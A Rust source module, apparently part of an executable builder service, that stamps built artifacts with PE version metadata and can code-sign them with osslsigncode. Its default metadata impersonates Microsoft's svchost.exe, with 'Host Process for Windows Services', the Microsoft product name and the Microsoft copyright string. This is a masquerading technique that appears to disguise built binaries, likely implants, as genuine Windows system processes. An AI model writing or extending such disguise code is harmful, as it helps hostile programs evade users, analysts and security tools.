use anyhow::Result;
use serde::{Deserialize, Serialize};
use tokio::sync::watch;
use crate::builder::job_store::JobStatus;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PeMetadata {
    pub company_name:      String,
    pub file_description:  String,
    pub product_name:      String,
    pub file_version:      String,
    pub original_filename: String,
    pub legal_copyright:   String,
    pub sign:              bool,
    pub cert_pem:          Option<String>,
}

impl Default for PeMetadata {
    fn default() -> Self {
        PeMetadata {
            company_name:      "Microsoft Corporation".into(),
            file_description:  "Host Process for Windows Services".into(),
            product_name:      "Microsoft Windows Operating System".into(),
            file_version:      "10.0.19041.1".into(),
            original_filename: "svchost.exe".into(),
            legal_copyright:   "\u{00A9} Microsoft Corporation. All rights reserved.".into(),
            sign:              false,
            cert_pem:          None,
        }
    }
}

pub fn apply_pe_metadata(
    artifact_path: &str,
    meta:          &PeMetadata,
    tx:            &watch::Sender<JobStatus>,
) -> Result<()> {
    let _ = tx.send(JobStatus::Building {
        progress: 90,
        msg: "Applying PE metadata...".into(),
    });

    // Write goversioninfo config JSON (for future goversioninfo invocation)
    let json_path = format!("{}.versioninfo.json", artifact_path);
    let config = serde_json::json!({
        "StringFileInfo": {
            "CompanyName":      meta.company_name,
            "FileDescription":  meta.file_description,
            "FileVersion":      meta.file_version,
            "InternalName":     meta.original_filename.trim_end_matches(".exe"),
            "LegalCopyright":   meta.legal_copyright,
            "OriginalFilename": meta.original_filename,
            "ProductName":      meta.product_name,
            "ProductVersion":   meta.file_version,
        }
    });
    std::fs::write(&json_path, serde_json::to_string_pretty(&config)?)?;

    // Sign if requested
    if meta.sign {
        if let Some(cert_pem) = &meta.cert_pem {
            let cert_path = format!("{}.cert.pem", artifact_path);
            std::fs::write(&cert_path, cert_pem)?;
            let signed_path = format!("{}.signed", artifact_path);
            let result = std::process::Command::new("osslsigncode")
                .args(["sign", "-certs", &cert_path,
                       "-in", artifact_path,
                       "-out", &signed_path])
                .output();
            if let Ok(out) = result {
                if out.status.success() {
                    std::fs::rename(&signed_path, artifact_path)?;
                }
            }
            std::fs::remove_file(&cert_path).ok();
        }
    }

    std::fs::remove_file(&json_path).ok();
    Ok(())
}
